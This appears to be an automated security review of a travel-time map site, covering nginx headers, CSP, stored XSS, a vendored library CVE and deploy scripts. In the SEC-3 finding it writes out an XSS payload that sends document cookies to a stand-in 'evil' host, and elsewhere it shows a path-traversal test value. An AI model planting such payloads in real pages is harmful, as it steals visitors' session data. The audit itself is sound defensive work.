# Security review — transport-maps

Reviewer: security-reviewer (read-only pass). Date: 2026-09-10.
Scope: OWASP Top 10 and adjacent concerns across the Python pipeline, scripts, tests, the static page, and the nginx deployment. Every claim below was validated against the code or the live site (`curl -sI https://worldmap.atik.kr/...`), not against comments or tests.

## Summary

| Severity | Count | IDs |
| --- | --- | --- |
| Critical | 0 | — |
| High | 1 | SEC-1 |
| Medium | 7 | SEC-2, SEC-3, SEC-4, SEC-5, SEC-6, SEC-7, SEC-8 |
| Low | 9 | SEC-9 … SEC-17 |

The three things to fix first: the security headers are not actually reaching browsers (SEC-1); the CSP that *would* be sent contradicts the page's own third-party calls, so fixing SEC-1 naively breaks search and analytics (SEC-2); and community-edited place and airport names are written into `innerHTML` unescaped with no CSP to catch it (SEC-3).

No secrets were found in the working tree or in git history. The Routes API key stays in `~/.config/transport-maps/env` (mode 0600, verified by `ls -l`) and is only ever sent as a request header to `routes.googleapis.com` over TLS.

---

## Findings

### SEC-1 — Security headers are dropped on every path a page load touches (nginx `add_header` inheritance)

- **Severity:** High  **Confidence:** High  **Status:** Confirmed (live)
- **Where:** `/Users/hletrd/flash-shared/transport-maps/deploy/worldmap.atik.kr.conf:26-32` (server-level `add_header` for CSP, HSTS, nosniff, X-Frame-Options, Referrer-Policy, Permissions-Policy) versus `:42-47`, `:51-56`, `:61-66`, `:69-71` (location blocks each containing their own `add_header Cache-Control ...`).

  ```nginx
  location ~* \.(html|js|json)$ {
      add_header Cache-Control "no-cache" always;   # <- replaces ALL server-level add_header
  }
  ```

- **Why it is a problem:** nginx inherits `add_header` from the enclosing level *only if the current level defines none*. Every location that sets `Cache-Control` therefore discards the six security headers. The result on the live host, verified with `curl -sI`:

  | Path | Headers present |
  | --- | --- |
  | `/` (index.html), `/index.json`, `/app.js`, `/vendor/maplibre-gl.js`, `/hover_cells.bin`, `/water.pmtiles`, `/vendor/*.woff2` | `cache-control` only. **No CSP, no HSTS, no nosniff, no X-Frame-Options, no Referrer-Policy, no Permissions-Policy** |
  | `/robots.txt`, `/preview.png`, any 404 | full header set |

  Because no response a real visit ever receives carries `Strict-Transport-Security`, browsers never record the HSTS policy at all; the `deploy/README.md:32` statement that HSTS is set is false in practice. The CSP comment at `worldmap.atik.kr.conf:24-26` ("the CSP stays tight") describes a header no page load receives, and the XSS surface in SEC-3 is therefore unmitigated.
- **Exploit / failure scenario:** any injection on the page (SEC-3, SEC-4) runs unconstrained; first-visit SSL-stripping is not prevented by HSTS; the page can be framed for clickjacking. It also means the headers were never exercised, so nobody noticed that the CSP is wrong for the page (SEC-2).
- **Fix:** put the six headers in a snippet and `include` it inside *every* location that has its own `add_header` (or use the `headers-more` module's `more_set_headers`, which does not have this inheritance rule). Then add a post-deploy assertion to `scripts/deploy_verify.sh:44-48`: for `/`, `/app.js`, `/index.json`, `/hover_cells.bin`, `/origins/seoul.pmtiles`, fail unless `content-security-policy` and `strict-transport-security` are present. This is exactly the class of "200 proves nothing" failure `CLAUDE.md` warns about.

### SEC-2 — The configured CSP contradicts the page's runtime third-party calls; the fix for SEC-1 will silently break search and analytics

- **Severity:** Medium  **Confidence:** High  **Status:** Confirmed
- **Where:**
  - `deploy/worldmap.atik.kr.conf:26`: `script-src 'self' blob:; ... connect-src 'self'` and `:2`: "no CDN, no external fonts, no runtime API calls".
  - `web/app.js:760-773` (`fetch("https://nominatim.openstreetmap.org/search?...")`) and `:809-813` (`/reverse`).
  - `web/index.html:4-11`: `<script async src="https://www.googletagmanager.com/gtag/js?id=G-2NYW09JSK2">` plus an inline bootstrap script (commit `b14148c`, present in `dist/index.html`, not yet on the live host).
  - `web/README.md:8-10` ("works behind a strict `script-src 'self'` CSP and has no third-party dependency"), `docs/superpowers/specs/...design.md:14-15` ("The site makes no runtime API calls").
- **Why it is a problem:** with the header as written, `connect-src 'self'` blocks both Nominatim fetches, `script-src 'self' blob:` blocks the gtag loader *and* the inline bootstrap (no nonce/hash), and `connect-src` blocks the GA beacons. The only reason the site works today is SEC-1. The moment someone fixes the inheritance bug without touching the policy, address search returns nothing (the code swallows the `TypeError` at `app.js:776`) and analytics stops, with no error in the UI. `scripts/browser_verify.sh:42-46` would catch the search regression, but only if it is run.
- **Exploit / failure scenario:** silent feature loss after a "security hardening" change; or, the opposite, someone loosens the CSP to `'unsafe-inline'` to make gtag load and gives up the protection SEC-3 needs.
- **Fix:** decide what the page is allowed to talk to and write it down once. Minimum viable policy for the current page: `connect-src 'self' https://nominatim.openstreetmap.org` and, if the tag stays, `script-src 'self' blob: https://www.googletagmanager.com 'nonce-…'` (or move the bootstrap into `app.js` and drop the inline script) plus `connect-src https://*.google-analytics.com https://*.analytics.google.com https://www.googletagmanager.com` and `img-src` for the GA pixel. Update the four documents that claim "no third-party calls". Add a test that greps `web/app.js`/`web/index.html` for `https://` hosts and asserts each is allowed by the CSP string in the conf, so the two cannot drift again.

### SEC-3 — Community-edited names reach `innerHTML` unescaped (stored XSS via GeoNames / OurAirports data)

- **Severity:** Medium  **Confidence:** High  **Status:** Confirmed (code); exploitation requires poisoning an upstream open dataset
- **Where:**
  - `web/app.js:596-601` `describe()` returns `` `<b>${lead}</b>${where ? ` — ${where}` : ""}` `` where `lead`/`where` are `p.name`, `p.region`, `p.country` from `places.json`, and `:614-617` assigns it with `$("where").innerHTML = ...`.
  - `web/app.js:622-624` `tip.innerHTML = `<b>…</b> <i>${where}</i>`` with `p.name`/`p.country`.
  - `web/app.js:730` `name.innerHTML = `<b>${a[0]}</b> ${a[1]}`` where `a[1]` is the airport name from `airports.json`.
  - Data provenance: `src/transport_maps/emit/places.py:49-65` (GeoNames `cities15000`, community-editable), `src/transport_maps/emit/airports_json.py:14-19` (OurAirports, community-editable).
  - The escaping helper that *does* exist, `web/app.js:503` `esc()`, is applied to airport tooltips and rail names (`:506`, `:510`, `:524`) but not to these three sites.
- **Evidence the path is live:** `dist/places.json` already contains 19 rows with `&`, `"`, `<` or `>` (e.g. `"Federation of B&H"`), and `dist/airports.json` four (e.g. `Bill & Hillary Clinton National Airport`). Today those only render as literal `&H`; the same channel carries `<img src=x onerror=…>` unchanged.
- **Why it is a problem:** an edit to a GeoNames place name or an OurAirports airport name is published to every visitor on the next rebuild, executes on hover (place names) or on typing two letters (airport names), and there is no CSP to stop it (SEC-1). This is also the one place where the user's "higher quality / ease of use" goal and security meet: names must render faithfully *and* safely.
- **Exploit / failure scenario:** attacker edits the OurAirports record for a small airport to `Foo<img src=x onerror="fetch('https://evil/?'+document.cookie)">`; maintainer rebuilds and deploys; anyone typing "fo" in the search box executes it.
- **Fix:** build these three fragments with `textContent`/`createElement` (the code already does this correctly for Nominatim results at `:794-798`, for pins at `:658-663`, and for legs at `:559-565`), or route every interpolated value through `esc()` and extend `esc()` to escape `>` and `'`. Add a build-time gate in `emit/places.py` / `emit/airports_json.py` that rejects any name containing `<`, `>` or a control character, so poisoned upstream data fails the build loudly instead of shipping.

### SEC-4 — Vendored MapLibre GL JS 5.24.0 carries CVE-2026-85061 (sanitizer bypass); the pinned line cannot receive the fix

- **Severity:** Medium  **Confidence:** High (presence) / Medium (reachability)  **Status:** Confirmed present; not reachable as currently configured
- **Where:** `web/vendor/maplibre-gl.js` (banner lines 1-6: `maplibre-gl@5.24.0`). The vulnerable loop is present in the minified bundle:

  ```js
  static removeAttributes(t){for(const{name:n,value:a}of t.attributes)pe.isPossiblyDangerous(n,a)&&t.removeAttribute(n)}
  ```

  i.e. iteration over the live `NamedNodeMap` while removing from it — the exact defect described in CVE-2026-85061 / GHSA-jrc7-96c5-q579 (fixed in 6.4.1). `pe.sanitize` is called from the attribution control's `innerHTML` update.
- **Mitigating facts:** `web/app.js:264` sets `attributionControl: false` and `web/index.html:97` hides `.maplibregl-ctrl-attrib`; the only attribution input would be the `attribution` field of the project's own PMTiles metadata (passed through by `web/vendor/pmtiles.js`), which is first-party. So the sink is not instantiated today.
- **Why it is still a problem:** the project ships a library with a published CVSS-critical XSS, and `web/README.md:24-28` forbids moving to 6.x (the only patched line) because pmtiles 4.x tile loading broke there. Nothing in the tests pins `attributionControl: false`; a well-meaning "add OSM attribution" change re-opens the sink with no CSP behind it (SEC-1).
- **Fix:** (a) add a test asserting `attributionControl: false` stays in `app.js` and that no `AttributionControl` is added; (b) re-evaluate the 6.x pin with the current pmtiles release (the README's blocker was a pmtiles 4.x `addProtocol` interaction — check whether pmtiles ≥ 4.5 with MapLibre ≥ 6.4.1 now works; if not, patch the vendored `removeAttributes` to iterate over `Array.from(t.attributes)` and record the patch in `web/README.md`); (c) record vendored file hashes in `web/README.md` or a `vendor.lock` so a re-download can be verified (see SEC-16).

### SEC-5 — Search-as-you-type against Nominatim violates the OSMF usage policy and can get the site's search cut off

- **Severity:** Medium  **Confidence:** High  **Status:** Confirmed
- **Where:** `web/app.js:754` (`render()` calls `scheduleAddressSearch(filter.trim())` on every `input` event), `:762-768` (fires 900 ms after the last keystroke once `q.length >= 4`), `:773` (`/search?format=jsonv2&limit=6&q=…`).
- **Why it is a problem:** the Nominatim Usage Policy states that auto-complete search is not allowed and must not be implemented client-side against the public API, caps usage at 1 request/second, and requires an identifying Referer or User-Agent plus visible attribution. Debouncing keeps the rate under 1/s per visitor, but "a request per pause in typing" is autocomplete by the policy's definition. Attribution is present (`app.js:801-803`), and the browser's default Referer identifies the site, so those two points are met.
- **Exploit / failure scenario:** OSMF blocks the Referer/site; every visitor's address search silently returns nothing (`app.js:776` swallows the error); the reverse-geocode label on click also stops. Since the pipeline and page have no fallback, a core UI feature disappears without a console error.
- **Fix:** trigger the Nominatim search on an explicit action (Enter key or a "Search addresses" button) rather than on input; keep the local city/airport filtering live. Keep the 1 req/s ceiling. Say in the Departure panel that address search and click-to-address go to OpenStreetMap's Nominatim (today this is stated only in `web/llms.txt:58`, which no visitor reads). If usage grows, self-host Nominatim or use a provider with terms that allow autocomplete.

### SEC-6 — Google Analytics added with no notice or consent, contradicting the project's own "no third-party" statements

- **Severity:** Medium  **Confidence:** High (presence) / Medium (regulatory impact)  **Status:** Confirmed present; legal exposure needs manual validation
- **Where:** `web/index.html:4-11` (gtag loader + inline bootstrap; commit `b14148c "chore(web): add the Google tag"`). Already in `dist/index.html:4-11`; the live `index.html` (last-modified 2026-09-09 13:28 GMT) does not yet contain it. Contradicted by `README.md` badges/"self-contained" copy, `web/README.md:8-10`, `deploy/worldmap.atik.kr.conf:2`, `docs/superpowers/specs/...design.md:14-15`, and by the page's own "Sources and method" panel (`web/index.html:403-414`) which names every data source but not Google.
- **Why it is a problem:** GA4 sets first-party cookies and sends page-view, approximate-location and client-id data to Google for every visitor with no opt-in and no notice. For EU visitors that is a consent matter under ePrivacy/GDPR; for a `.kr` site PIPA disclosure obligations apply. Separately, the tag arrives on the page before `<meta charset>` and before the CSP question in SEC-2 is settled, and `browser_verify.sh:60` will count the CSP-violation console errors once SEC-1 is fixed, so the deploy verification will start failing on the tag.
- **Exploit / failure scenario:** regulatory complaint; loss of the "self-contained, no tracking" trust the README sells; deploy verification failing for a reason unrelated to the map.
- **Fix:** either remove the tag (nginx access logs already give page views without shipping JavaScript to visitors), or keep it and (1) add a one-line disclosure to the Sources panel and `llms.txt`, (2) gate it behind consent for EU visitors, (3) move the bootstrap into `app.js` (no inline script), (4) add the Google hosts to the CSP (SEC-2), (5) correct the four documents that promise no third-party calls.

### SEC-7 — Deploy is non-atomic (`rsync -a --delete` in place); mixed asset sets are served mid-deploy and file modes are propagated verbatim

- **Severity:** Medium  **Confidence:** High  **Status:** Confirmed (by construction)
- **Where:** `scripts/deploy_verify.sh:40-41`:

  ```bash
  rsync -a --exclude 'README.md' web/ dist/
  rsync -a --delete --info=progress2 dist/ atik.kr:/var/www/worldmap/ 2>&1 | tail -c 200; echo
  ```

  and `deploy/README.md:6`.
- **Why it is a problem:** rsync updates files one at a time. A deploy of 553 origins plus a 134 MB `water.pmtiles` takes minutes; a visitor who loads `index.html` after it has been replaced but `app.js`/`hover_cells.bin`/`origins/*.bin` before they have is exactly the "blank globe with no console error" case `CLAUDE.md` documents, and `no-cache` does not help because the files are genuinely inconsistent on the server at that moment. `-a` also preserves permissions, which is how a 0600 artifact once shipped as a 403 (`tests/sources/test_cache_provenance.py:133-149` records the incident). The consistency check at `:9-37` runs *before* the transfer and cannot see the transfer's own window. `tail -c 200` truncates rsync's error output, so a failed partial sync prints a fragment.
- **Exploit / failure scenario:** every deploy has a multi-minute window in which the live site can be blank for new visitors; a partially failed rsync leaves a mixed tree permanently with only 200 bytes of diagnostics.
- **Fix:** `rsync -a --delete-delay --delay-updates --chmod=D755,F644 ...` (all updated files are moved into place at the end of the transfer, and modes are normalised), or deploy into `/var/www/worldmap-releases/<sha>/` and swap a symlink. After the transfer, compare local and remote checksums (`rsync -aic --dry-run` should print nothing) and assert the security headers (SEC-1) before declaring success. Drop `| tail -c 200` or write the full log to a file.

### SEC-8 — The licence firewall is real but narrow: it is not on the deploy path and does not know about the providers actually used

- **Severity:** Medium  **Confidence:** High  **Status:** Confirmed
- **Where:** `tests/test_licence_firewall.py:11` (`FORBIDDEN = ("fr24", "flightradar", "flightaware", "aeroapi", "fa_flight_id")`), `:15` (`SCANNED_SUFFIXES = {".json", ".geojson", ".toml"}`), `:28-36`, `:58-72`. Deploy path: `scripts/deploy_verify.sh` (never runs pytest). Google-derived samples: `scripts/calibrate_ground.py:38,152-155` (`--out` defaults to `data/build/ground_samples.json`, user-overridable to anywhere), `data/build/ground_samples*.json` present on disk (gitignored). `pyproject.toml:37-39` (`addopts = "-m 'not network'"`).
- **What is genuinely good:** the scan loop is proven non-vacuous (`:43-55` mutate the input and assert skip/fail), and the untracked `tests/sources/test_cache_provenance.py` follows the same "prove it goes red" discipline.
- **Why it is still a problem:**
  1. The token list names two providers the project never integrated (the spec's D15 replaced them with adsb.lol). The commercial source that *is* in use, Google Routes (`src/transport_maps/calibrate/ground.py:29`), has no token, and `ground_samples*.json` (per-journey Google durations) would pass the firewall verbatim if `--out dist/...` were ever used or a file were copied.
  2. Only `.json/.geojson/.toml` are scanned. `index.html` (JSON-LD `isBasedOn`), `llms.txt`, `app.js`, and binary artifacts are not.
  3. `test_calibration_contains_only_numbers` (`:58-72`) accepts any scalar including strings, and lists are the only forbidden shape; a `[records.r1] dep="ICN" ...` table dump under 4,000 bytes passes a test whose name says "only numbers".
  4. It skips (not fails) whenever `dist/` is empty, so on any machine other than the build box it never runs; and nothing in the deploy script runs it on the build box either. A test that gates nothing is documentation.
  5. Google Maps Platform's service terms restrict caching Routes content and using it "with a non-Google map"; the project fits coefficients from Routes durations and uses them to draw a non-Google map. Whether fitted per-class speeds count as Google content is a legal question, but the firewall does not even ask it. *(Needs manual validation.)*
- **Fix:** add `"routes.googleapis.com"`, `"ground_samples"`, `"observed_min"`, `"class_km"` and `"adsb"` (raw legs, not the attribution string) to the token list, or better, replace token matching with an allowlist of the exact file names permitted under `dist/`; scan every text file; make `deploy_verify.sh` run `uv run pytest tests/test_licence_firewall.py` and refuse to rsync on failure; tighten `test_calibration_contains_only_numbers` to allow strings only under `[meta]`; get a written read on the Google Routes terms and record the conclusion next to D9 in the spec.

### SEC-9 — Downloads have no integrity or provenance checks

- **Severity:** Low  **Confidence:** High  **Status:** Confirmed
- **Where:** `src/transport_maps/sources/airports.py:27`, `countries.py:61`, `landmask.py:53`, `roads.py:37`, `emit/places.py:38`, `emit/borders.py:27`, `emit/water.py:52` (all `httpx.get/stream(..., follow_redirects=True, timeout=...)`, cached on bare `.exists()`, no hash); `scripts/osm_rail.sh:33-38` (Geofabrik publishes `<file>.md5`, unused); `scripts/adsb_extract.py:90-118` (GitHub release assets, no size cap, no hash); `scripts/expand_origins.py:44-46` (`httpx.get` without `follow_redirects`, cache written non-atomically with `write_bytes`); `sources/_utils.py:13-34` (`Retry-After` honoured without an upper bound — a hostile or broken server can make the crawl sleep for hours).
- **Why it is a problem:** a compromised mirror or CDN changes the build silently and forever (the raw cache is keyed on existence). TLS verification is on everywhere (no `verify=False` in the tree), which limits this to upstream compromise rather than MITM. `follow_redirects=True` will also follow an `https`→`http` redirect.
- **Fix:** record `sha256` of every downloaded artifact in a `data/cache/MANIFEST.json`, print it in the build log, and ship the manifest's digest in `index.json` provenance; verify Geofabrik `.md5`; cap `_retry_after_seconds` at, say, 300 s; make `expand_origins.py` use `_atomic_write` and `follow_redirects=True` like the rest; add contact information to the Wikimedia `User-Agent` (`sources/routes.py:23`, `sources/wikidata.py:20`) as the WMF User-Agent policy asks.

### SEC-10 — Artifact permissions follow the umask and rsync preserves them; dotfile/temp leftovers would be deployed and served

- **Severity:** Low  **Confidence:** High  **Status:** Confirmed
- **Where:** `src/transport_maps/sources/_utils.py:85` (`os.chmod(tmp_path, 0o666 & ~_umask())`); `scripts/deploy_verify.sh:41` (`rsync -a` preserves modes); `deploy/worldmap.atik.kr.conf:73-75` (no `location ~ /\. { deny all; }`); `_utils.py:76` (temp files named `.<name>.XXXX.tmp` inside `dist/`, removed only on a Python exception, not on SIGKILL/OOM).
- **Why it is a problem:** under `umask 0` (cron, some service managers) artifacts become 0666 and land world-writable in `/var/www/worldmap`; a killed build leaves `.index.json.abcd.tmp` in `dist/`, which rsync ships and nginx serves (nginx serves dotfiles by default; `/vendor/` correctly returns 403 for listings, and `/.git/HEAD` is 404, verified).
- **Fix:** `os.chmod(tmp_path, 0o644)` (the artifacts are public files; there is no case for group/other write); `--chmod=D755,F644 --exclude '.*' --exclude '*.tmp' --exclude '*.part'` on the deploy rsync; `location ~ /\. { deny all; }` in nginx; have `deploy_verify.sh` refuse if `find dist -name '.*' -o -name '*.tmp'` finds anything.

### SEC-11 — The page trusts binary array lengths and fails blank instead of loudly

- **Severity:** Low  **Confidence:** High  **Status:** Confirmed
- **Where:** `web/app.js:27` (`await (await fetch("./index.json")).json()` — no `r.ok` check; a 404/HTML body throws at module top level and the page is blank), `:38-40` (`new BigUint64Array(arrayBuffer)` throws `RangeError` if the byte length is not a multiple of 8 — also top level), `:407`/`:418`/`:422`/`:400` (per-origin `Uint16Array`s are never checked against `hoverCells.length`; a mismatch silently reads the wrong cell or `undefined`), `:494-497` (`hoverModes[i * n + k]` out of range yields `undefined` → filtered). Server-side the lengths are checked (`scripts/deploy_verify.sh:9-37`), but only before deploy and only if the script is used.
- **Why it is a problem:** this is the documented "blank globe with no console error" failure. A defensive page costs three lines and turns a silent mismatch into a visible message.
- **Fix:** after each array fetch, `if (arr.length !== hoverCells.length) { showError("origin data does not match the cell index"); return; }`; wrap the top-level awaits in a try/catch that renders a visible banner in `#where` instead of leaving the readout at "—"; check `r.ok` before `.json()`.

### SEC-12 — Origin slugs from `origins.toml` are not validated on the `build-all` path; `expand_origins.py` writes third-party names into TOML unescaped

- **Severity:** Low  **Confidence:** High  **Status:** Confirmed
- **Where:** `src/transport_maps/cli.py:26-34` (`_SLUG_RE` applied only to `solve --name`); `src/transport_maps/emit/index.py:81-88` (`load_origins` checks uniqueness only); `cli.py:95-103` (`out / f"{slug}.pmtiles"` etc.); `scripts/expand_origins.py:94-99` (`name = "{o["name"]}"` without escaping quotes/backslashes; slugs are produced by `slugify` and are safe).
- **Why it is a problem:** `origins.toml` is repo-controlled, so this is a hardening gap rather than an exposure, but a slug of `../../x` would write outside `dist/origins`, and the CLI already has the regex — it is just not applied where 553 of the 554 origins come from. A GeoNames name containing `"` makes `expand_origins.py` emit invalid TOML (fails loud, not silent).
- **Fix:** apply `_SLUG_RE.fullmatch` to every slug in `load_origins`; write TOML via `tomllib`-compatible quoting (e.g. `json.dumps(name)` produces a valid TOML basic string for the common cases) or `tomli_w`.

### SEC-13 — `adsb_extract.py` builds a cache path from an upstream-controlled tag name and downloads without bounds

- **Severity:** Low  **Confidence:** High  **Status:** Confirmed
- **Where:** `scripts/adsb_extract.py:103-104` (`target = cache / f"{tag}.tar"` with `tag = rel["tag_name"]` from the GitHub API; GitHub tags may contain `/` and `..`), `:110-115` (unbounded download of every asset in the release), `:143-147` (streaming `tarfile` with `extractfile` only — no extraction to disk, so no tar path traversal; correct).
- **Fix:** `tag = re.sub(r"[^A-Za-z0-9._-]", "_", tag)`; verify assets against the release's published digests if any; keep the streaming tar reader as is.

### SEC-14 — Geolocation is requested at page load with no user gesture

- **Severity:** Low  **Confidence:** High  **Status:** Confirmed
- **Where:** `web/app.js:956-970`; `web/index.html:364` (the `#here` line explains it only after the prompt has appeared).
- **Why it is a problem:** unprompted permission requests are the pattern browsers are moving to auto-deny, and it is the first thing a visitor sees. The position itself is handled well: it never leaves the page (it picks the nearest charted city and centres the view) and Permissions-Policy limits it to `self` (once SEC-1 delivers that header).
- **Fix:** request on a "Start from my location" control in the Departure panel, keep the Seoul fallback as the default.

### SEC-15 — Verification scripts are stale or unsafe in small ways

- **Severity:** Low  **Confidence:** High  **Status:** Confirmed
- **Where:** `scripts/browser_verify.sh:19` (`"cities":157` — `data/origins.toml` now has 553 `[[origin]]` blocks, so the script fails on a correct deploy), `:41` (`"schemes":12` hard-coded), `:7` and `:59,71` (`cd /tmp`, screenshots to fixed `/tmp/verify_*.png` — predictable paths in a shared directory), `:74` (`kill -9` of any process whose command line matches `agent-browser`, which is broader than "agent-browser's own Chrome tree"); `scripts/deploy_verify.sh:6` (`cd /Users/hletrd/flash-shared/transport-maps` — an absolute home path committed to the repo), `:44-48` (checks only the status code, no headers, no checksum).
- **Fix:** derive the expected city count from `dist/index.json`; use `mktemp -d`; match the exact PIDs returned by `agent-browser` or the `~/.agent-browser/browsers/` executable path; `cd "$(dirname "$0")/.."`; add header and checksum assertions (see SEC-1, SEC-7).

### SEC-16 — Supply-chain hygiene: unused dependency, no audit step, vendored JS without a recorded hash

- **Severity:** Low  **Confidence:** High  **Status:** Confirmed
- **Where:** `pyproject.toml:20` (`selectolax` declared; `git grep selectolax -- src scripts tests` finds no use); `web/vendor/*.js` (jsDelivr "bundled" builds; `web/README.md:12-13` says to refresh by re-downloading, with no hash to compare against; current `sha256`: maplibre `c51e43e8…`, pmtiles `ea53f031…`, h3 `fcaa69b1…`, fflate `d22d6035…`); `web/index.html:76-78,430` (module scripts are same-origin, so an `integrity` attribute would work and is unused); no `pip-audit`/`osv-scanner` step anywhere.
- **Notes from the sweep:** MapLibre has a live critical advisory (SEC-4). No advisories were found in a web search for fflate 0.8.3, pmtiles 4.5.0 or h3-js 4.2.1. The locked Python set (`httpx 0.28.1`, `numpy 2.5.2`, `polars 1.44.1`, `pyarrow 25.0.1`, `rasterio 1.5.1`, `shapely 2.1.2`, `scipy 1.18.1`, `osmium 4.3.1`, `pyogrio 0.13.0`, `urllib3 2.7.0`, `requests 2.34.2`, `certifi 2026.7.22`) is newer than any advisory knowledge available offline; it was not audited against OSV here. *(Needs manual validation: run `uvx pip-audit` or `osv-scanner --lockfile uv.lock`.)*
- **Fix:** remove `selectolax`; add `osv-scanner --lockfile uv.lock` and an npm-audit-equivalent for the four vendored packages to the pre-deploy checklist; record vendor hashes in `web/README.md` and add `integrity=` to the three `modulepreload` links and the `app.js` script tag (same-origin SRI is valid and catches a half-written upload).

### SEC-17 — Licence statements on the page and in the README need a legal read

- **Severity:** Low  **Confidence:** Medium  **Status:** Needs manual validation
- **Where:** `web/index.html:55` (JSON-LD declares the whole dataset `"license": ODbL 1.0`), `README.md:48-56` and `src/transport_maps/emit/index.py:22-78` (inputs include Wikipedia CC BY-SA 4.0, GeoNames CC BY 4.0, HydroLAKES CC BY 4.0, OSM ODbL). The attribution block itself is complete and tested (`tests/emit/test_index.py:30-83`).
- **Why it matters:** CC BY-SA 4.0 requires adaptations to be released under the same or a CC-compatible licence; ODbL is not on the CC compatibility list, so declaring the combined dataset ODbL may not satisfy Wikipedia's share-alike for the route network. This is not a code defect, but it is a public claim in machine-readable form.
- **Fix:** have someone with the relevant expertise choose the declared licence (or declare per-component licences in the JSON-LD `isBasedOn`/`license` structure) and record the reasoning in the spec's decision log.

---

## Final sweep

| Check | Result |
| --- | --- |
| Secrets in git history (`git log --all -p` grepped for `AIza…`, `api[_-]?key=`, `secret=`, `password=`, private-key headers, GitHub/Slack/OpenAI token shapes) | none |
| `.env`, `*.pem`, `*.key`, credential or sample files ever committed | none (`git log --all --diff-filter=A --name-only`) |
| Routes API key handling | `calibrate/ground.py:58-64` reads `GOOGLE_ROUTES_API_KEY` from the environment, sends it only as `X-Goog-Api-Key` to `routes.googleapis.com` over TLS; never logged; `~/.config/transport-maps/env` is mode 0600 |
| `shell=True`, `os.system`, `os.popen` | none; `emit/tiles.py:41-61` and `emit/water.py:102-123` use list-form `subprocess.run` with `check=True`; arguments are constants plus paths the pipeline generates |
| `eval` / `new Function` / `document.write` in `web/app.js` and all vendored JS | none |
| `target="_blank"` without `rel` | no external links on the page at all |
| Mixed content | none; all runtime URLs are `https://`; port 80 301s to https |
| `Content-Type` / `nosniff` | types correct (`text/html`, `application/javascript`, `application/json`, `application/octet-stream`, `font/woff2`); `nosniff` not delivered on document paths — see SEC-1 |
| Cache headers vs. mixed-asset failure | `no-cache` present on html/js/json/bin/pmtiles (verified live); the remaining window is the deploy itself — SEC-7; fonts `immutable` for a year despite not being content-hashed names (a same-name font swap would be cached stale for a year — low) |
| Unsafe deserialisation | `np.load(..., allow_pickle=False)` explicit in `contour/grid.py:45,98`; default (safe) in `sources/roads.py:71` — make it explicit; `tomllib`/`json` only otherwise |
| Archive extraction | `zipfile.extractall` in `emit/water.py:79` (stdlib strips `..`/absolute members); `tarfile` streamed via `extractfile` only (`scripts/adsb_extract.py:143-147`); `ZipFile.read(member)` elsewhere |
| Path traversal in caches | cache names are constants or derived from constant URLs (`places.py:36`, `water.py:50`); slug validation gap — SEC-12; upstream tag name — SEC-13 |
| Network client hygiene | timeouts on every `httpx` call (`scripts/calibrate_ground.py:73` creates the client without one but passes `timeout=TIMEOUT_S` per request at `calibrate/ground.py:76-79`); TLS verification default-on everywhere; retries bounded (`MAX_RETRIES = 6`) except the unbounded `Retry-After` sleep — SEC-9 |
| Dependencies with known advisories | maplibre-gl 5.24.0 → CVE-2026-85061 (SEC-4); Python lockfile not auditable offline (SEC-16) |
| Absolute local paths leaking into `dist/` | none in `index.json`, `llms.txt`, `sitemap.xml`, `index.html`, `app.js` (grepped for `/Users/`, `/home/`, `/var/www`, the username); the only committed absolute path is `scripts/deploy_verify.sh:6` |
| Directory listing / repository exposure on the live host | `/vendor/` → 403, `/.git/HEAD` → 404, `/README.md` → 404 |
| `dist/` contents vs. code | `dist/index.json` is from an earlier build (`solveRes: 5`, no `fineRes`/`modeDetail`); irrelevant to security but confirms `deploy_verify.sh`'s "same build" rule matters |
| `origins.toml` | 553 origins; every slug matches `^[a-z0-9-]+$`; no markup in names |
| Nominatim requests | Referer identifies the site (browser default policy); `Accept-Language` is a CORS-safelisted header (no preflight); attribution shown — policy issue is the autocomplete pattern, SEC-5 |
| Test vacuity (per `CLAUDE.md`) | licence-firewall scan and cache-provenance tests include mutation proofs; `test_calibration_contains_only_numbers` is weaker than its name (SEC-8); `tests/test_cli.py:17-24` really does exercise `_slug` against `../../etc/passwd` |

## Coverage

Every file below was read in full (line-by-line) unless marked *grep*:

- Root: `/Users/hletrd/flash-shared/transport-maps/CLAUDE.md`, `README.md`, `calibration.toml`, `pyproject.toml`, `.gitignore`, `.python-version`, `uv.lock` (versions extracted), `data/origins.toml` (*grep*: slugs, names, count).
- Deploy: `deploy/worldmap.atik.kr.conf`, `deploy/README.md`.
- Scripts: `scripts/adsb_extract.py`, `scripts/browser_verify.sh`, `scripts/build_water_tiles.py`, `scripts/calibrate_ground.py`, `scripts/check_ramps.py`, `scripts/deploy_verify.sh`, `scripts/expand_origins.py`, `scripts/ground_check.py`, `scripts/osm_rail.sh`.
- Package: `src/transport_maps/__init__.py`, `cli.py`, `config.py`, `validate.py`; `calibrate/__init__.py`, `calibrate/fit.py`, `calibrate/ground.py`; `contour/__init__.py`, `contour/bands.py`, `contour/grid.py`; `emit/__init__.py`, `emit/airports_json.py`, `emit/borders.py`, `emit/hover.py`, `emit/index.py`, `emit/itinerary.py`, `emit/modes.py`, `emit/places.py`, `emit/rail_detail.py`, `emit/routes_json.py`, `emit/tiles.py`, `emit/water.py`; `graph/__init__.py`, `graph/air.py`, `graph/build.py`, `graph/ground.py`, `graph/nodes.py`, `graph/rail.py`, `graph/refine.py`, `graph/transfers.py`; `solve/__init__.py`, `solve/dijkstra.py`; `sources/__init__.py`, `sources/_utils.py`, `sources/airports.py`, `sources/countries.py`, `sources/landmask.py`, `sources/osm.py`, `sources/roads.py`, `sources/routes.py`, `sources/urban.py`, `sources/wikidata.py` (working-tree versions; `git diff` on the four files marked modified was empty at review time).
- Tests: `tests/test_cli.py`, `tests/test_config.py`, `tests/test_golden.py`, `tests/test_licence_firewall.py`, `tests/test_validate.py`; `tests/calibrate/test_fit.py`, `tests/calibrate/test_ground.py`; `tests/cli/test_entrypoint.py`; `tests/contour/test_bands.py`, `tests/contour/test_grid.py`, `tests/contour/test_native_grid.py`; `tests/emit/test_hover.py`, `test_index.py`, `test_itinerary.py`, `test_modes.py`, `test_rail_detail.py`, `test_routes_json.py`, `test_tiles.py`; `tests/graph/test_air.py`, `test_build.py`, `test_ferry.py`, `test_ground.py`, `test_nodes.py`, `test_rail.py`, `test_rail_integration.py`, `test_refine.py`, `test_transfers.py`; `tests/solve/test_dijkstra.py`; `tests/sources/__init__.py`, `test_airports.py`, `test_cache_provenance.py` (untracked), `test_countries.py`, `test_landmask.py`, `test_osm.py`, `test_roads.py`, `test_routes.py`, `test_urban.py`, `test_wikidata.py`; `tests/web/test_ramps.py`; `tests/fixtures/icn_wikitext.txt` (*grep* for secrets only); the empty `__init__.py` files.
